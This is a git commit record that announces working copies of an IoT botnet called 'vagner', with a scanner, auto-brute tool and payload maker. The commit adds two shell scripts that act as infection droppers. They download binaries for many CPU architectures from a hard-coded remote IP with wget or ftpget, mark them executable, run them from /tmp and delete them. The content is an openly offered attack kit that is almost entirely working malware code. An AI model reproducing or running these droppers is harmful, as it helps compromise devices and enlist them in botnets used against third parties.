5a59a4c931da054a696ed1a48aab68c40c8989bd
Rin <147572260+NyaaRin@users.noreply.github.com>
2023-10-31 21:30:23 -0500

    Actual working versions of vagner
    comes with
    vagner(Vbot-IOT.rar)
    a working scanner that has a full tut and auto brutes
    sh.py which makes payloads
    and 2 .sh files one for wget and one for ftpget as a quick example

---
+++ working srcs/VR.sh
@@ -0,0 +1,10 @@
+cd /tmp
+wget http://2.58.95.55/bins/VR.arm7; chmod 777 VR.arm7; ./VR.arm7 VR.arm7.wget; rm -rf VR.arm7
+wget http://2.58.95.55/bins/VR.arm; chmod 777 VR.arm; ./VR.arm VR.arm.wget; rm -rf VR.arm
+wget http://2.58.95.55/bins/VR.mips; chmod 777 VR.mips; ./VR.mips VR.mips.wget; rm -rf VR.mips
+wget http://2.58.95.55/bins/VR.mpsl; chmod 777 VR.mpsl; ./VR.mpsl VR.mpsl.wget; rm -rf VR.mpsl
+wget http://2.58.95.55/bins/VR.x86; chmod 777 VR.x86; ./VR.x86 VR.x86.wget; rm -rf VR.x86
+wget http://2.58.95.55/bins/VR.ppc; chmod 777 VR.ppc; ./VR.ppc VR.ppc.wget; rm -rf VR.ppc
+wget http://2.58.95.55/bins/VR.spc; chmod 777 VR.spc; ./VR.ppc VR.spc.wget; rm -rf VR.spc
+wget http://2.58.95.55/bins/VR.sh4; chmod 777 VR.sh4; ./VR.sh4 VR.sh4.wget; rm -rf VR.sh4
+wget http://2.58.95.55/bins/VR.m68k; chmod 777 VR.m68k; ./VR.m68k VR.m68k.wget; rm -rf VR.m68k
---
+++ working srcs/VR3.sh
@@ -0,0 +1,11 @@
+cd /tmp
+ftpget 2.58.95.55 VR.arm7 VR.arm7; chmod 777 VR.arm7; ./VR.arm7 VR.arm7.ftp; rm -rf VR.arm7
+ftpget 2.58.95.55 VR.arm VR.arm; chmod 777 VR.arm; ./VR.arm VR.arm.ftp; rm -rf VR.arm
+ftpget 2.58.95.55 VR.m68k VR.m68k; chmod 777 VR.m68k; ./VR.m68k VR.m68k.ftp; rm -rf VR.m68k
+ftpget 2.58.95.55 VR.arm VR.arm; chmod 777 VR.arm; ./VR.arm VR.arm.ftp; rm -rf VR.arm
+ftpget 2.58.95.55 VR.mips VR.mips; chmod 777 VR.mips; ./VR.mips VR.mips.ftp; rm -rf VR.mips
+ftpget 2.58.95.55 VR.mpsl VR.mpsl; chmod 777 VR.mpsl; ./VR.mpsl VR.mpsl.ftp; rm -rf VR.mpsl
+ftpget 2.58.95.55 VR.x86 VR.x86; chmod 777 VR.x86; ./VR.x86 VR.x86.ftp; rm -rf VR.x86
+ftpget 2.58.95.55 VR.ppc VR.ppc; chmod 777 VR.ppc; ./VR.ppc VR.ppc.ftp; rm -rf VR.ppc
+ftpget 2.58.95.55 VR.spc VR.spc; chmod 777 VR.spc; ./VR.spc VR.spc.ftp; rm -rf VR.spc
+ftpget 2.58.95.55 VR.sh4 VR.sh4; chmod 777 VR.sh4; ./VR.sh4 VR.sh4.ftp; rm -rf VR.sh4
